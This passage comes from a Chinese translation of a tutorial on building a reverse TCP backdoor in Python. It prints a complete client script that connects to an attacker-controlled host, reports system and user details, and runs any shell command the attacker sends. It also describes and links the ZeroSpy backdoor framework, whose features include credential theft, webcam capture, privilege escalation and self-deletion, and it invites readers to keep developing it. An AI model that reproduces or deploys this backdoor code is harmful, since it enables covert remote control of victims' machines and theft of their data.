    main_control()
```

**connect_part2.py**

```
# -*- coding: utf-8 -*-
import socket,subprocess as sp,sys,os,platform

# 连接函数
def connect():
    try:
        # host  = str(sys.argv[1])
        # port  = int(sys.argv[2])

        host = "192.168.14.45"   # 测试IP
        port = 3800               # 测试端口
    except Exception as e:
        sys.exit(1)

    conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    conn.connect((host,port))

    x_info = ""

    #for x in os.uname():
    for x in platform.uname():
        x_info += x + ","

    # 平台判断
    if platform.system() == "Linux":
        x_info += os.getlogin()  # Linux平台
    elif platform.system() == "Windows":
        x_info += os.getenv('username')  # Windows

    # 发送数据
    conn.send(x_info)

    # 会话维持
    interactive_session(conn)
    conn.close()

# 会话维持
def interactive_session(conn):
    while 1:
        try:
            command = str(conn.recv(1024))
        except socket.error:
            sys.exit(1)

        if command.split(" ")[0] == "exec":
            res = 1
            msg = ""

            while len(command.split(" ")) &gt; res:
                msg += command.split(" ")[res] + " "
                res += 1

            sh = sp.Popen(msg,shell=True,
                          stdout= sp.PIPE,
                          stderr = sp.PIPE,
                          stdin= sp.PIPE)
            out,err = sh.communicate()

            result = str(out) + str(err)

            send_data(conn,result)

        elif command == "exit()":
            break
        else:
            send_data(conn,"[-] Unknown Command")
# 发送数据
def send_data(conn,data):
    length = str(len(data)).zfill(16)
    conn.send(length + data)

if __name__ == "__main__":
    connect()
```



## 0x3 最终介绍

随着某些勒索软件的教程，有些用户已经开始把文章中的代码装备到了自己写的恶意软件里。把知识用于恶意盈利，这不是作者愿意看到的局面。

这个TCP反向连接后门思路，已经事先写好了程序，并构建成了一个框架。作者实现了很多功能，比如远程导入、下载、获取root权限和升级攻击、网络摄像头、屏幕截图、情报搜集、窃取凭证等功能。为了让这个后门程序能够在大多数Linux发行版中得到充分的支持，已经尝试将其移植到各种发行版中，以解决不同的系统设计问题。

但是很不幸，作者删除了最后一个虚拟机（里面有程序最新的代码），因为硬件设备有限，只能通过利用虚拟机的方式来节省空间。如今只能把最后备份的文件贡献了出来，有兴趣的人可以把它继续开发得更加全面来帮助论坛。

为了让感兴趣的开发者了解项目中的信息，这里展示部分项目的截图。项目地址如下：

```
ZeroSpy：https：//github.com/sergeantexploiter/zero
```

### <a class="reference-link" name="3.1%20%E5%90%AF%E5%8A%A8%E7%95%8C%E9%9D%A2%EF%BC%88%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%89"></a>3.1 启动界面（攻击者）

使用python zero.py命令在目录中启动程序。

[![](https://p3.ssl.qhimg.com/t01bbfd3856844a23fe.png)](https://p3.ssl.qhimg.com/t01bbfd3856844a23fe.png)

这个本来有个横幅文字展示，但是为了节省展示空间，我删除掉了。输入help命令打印出帮助命令。这个程序首先检查状态是不是已经正常运行。是通过框架启动时加载的自定义别名文件实现的，在不同的端口上开始监听，而不是手动输入。运行状态文件使用相同的命令代码，类似在终端中输入使用的方式一样。

功能函数代码主要放置在configurations文件夹。使用start_services命令可以把程序运行起来，启动了多个监听器，使用HASH标签做注释。

随意使用命令，我演示的是start_server命令，它接受两个参数：主机和端口。如果要为主机输入空的double/single字符串，请改用localhost。只是为了帮助程序更好地显示。

[![](https://p0.ssl.qhimg.com/t0169d1c07ca3dddf83.png)](https://p0.ssl.qhimg.com/t0169d1c07ca3dddf83.png)

我们可以在一个监听器上接受多个客户端，就不会中断同一监听端口上的其他连接。

### <a class="reference-link" name="3.2%20%E5%8F%97%E6%8E%A7%E7%AB%AF%E7%95%8C%E9%9D%A2%20(%E5%8F%97%E5%AE%B3%E8%80%85)"></a>3.2 受控端界面 (受害者)

客户端脚本使用connect.py文件。语法是：python connect.py &lt;host&gt; &lt;port&gt;。客户端具有自动连接功能，如果连接失败会重新连接。

### <a class="reference-link" name="3.3%20%E5%9B%9E%E8%BF%9E%E7%95%8C%E9%9D%A2%20(%E6%94%BB%E5%87%BB%E8%80%85)"></a>3.3 回连界面 (攻击者)

当客户端连接时，我们在终端上得到类似的东西。

[![](https://p5.ssl.qhimg.com/t012fb92458759d6044.png)](https://p5.ssl.qhimg.com/t012fb92458759d6044.png)

这不会让我们直接进入shell，而是将其推入后台，以便让我们继续做正在做的事情（Defaults idea）。程序可以使用sessions命令列出所有的会话连接。

然后可以使用interact命令和会话ID进行交互。

[![](https://p0.ssl.qhimg.com/t01a9758b2defae9968.png)](https://p0.ssl.qhimg.com/t01a9758b2defae9968.png)

当连接到一个客户端，有一个全新的命令集（这是在没有备份的情况下进行开发的地方）。

[![](https://p3.ssl.qhimg.com/t01e1e28804520f834f.png)](https://p3.ssl.qhimg.com/t01e1e28804520f834f.png)

开发命令是 host-scanner（需要的线程），check_vm（需要更多的跨平台的结果），webcam_list webcam_snap（代码已经毁擦除掉的虚拟机里），检索目录（嵌入到脚本中，但不会在屏幕中显示 – 克隆给定的目录 – 取得了一些进展但也毁在虚拟机里），截图（像lubuntu这样的老版本和裸发行版需要更多的库支持）。加密命令（重构为使用内部安全密钥与攻击者进行第一次数据通信，DH密钥交换和AES-SHA256进行数据传输）。

在执行sysinfo命令后会提示shell（会话）的签名信息。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b8df92ff400429e9.png)

该签名首先计算并存储在脚本部署之前的散列算法。我不知道是否在旧版本中实现了攻击者的检查特性，但整个想法是在接受连接之前检查shell签名。这是为了防止在脚本被发现时篡改，脚本使用它自己的源代码作为签名。如果签名不匹配，连接应该会删除。如果数据传输的加密不安全(用户可以先获得签名，然后用篡改的脚本发送相同的签名)，那么该特性就可以被击败。

客户机/受害者脚本也有一个自毁特性(sh()在脚本中被注释掉)，这是在第一次连接时执行的。该特性使用了分解，如果不存在，则使用了一个内置的分解函数(我认为这是不安全的)。<br>
另一个实现但失败的特性是可伸缩性。我有一个独立的程序，允许攻击者选择自己的模块并将它们编译到客户机脚本中，而不需要使用整个客户机脚本。在成功连接之后，客户端将所有可用的命令发送给攻击者。

这里有一个Bug的地方，就是当受害者客户端断开后，不会在攻击者的一侧被删除。这可以通过在zero.py中从连接数组和会话数组变量中删除id来解决。

我之所以上传这些文件，是因为其他人可能需要它，可能是因为我个人在Python脚本中看到了潜力。如果我不继续写下去，也并不意味着别人就可以牺牲晚上的时间来实现我的想法，并从我停止的地方继续开发下去。



## 0x4 参考

How To Make A Reverse TCP Backdoor In Python – Part 1

[https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038](https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038)

How To Make A Reverse TCP Backdoor In Python – Part 2

[https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-2/1040](https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-2/1040)

How To Make A Reverse TCP Backdoor In Python – Part 3

[https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-3/4228](https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-3/4228)
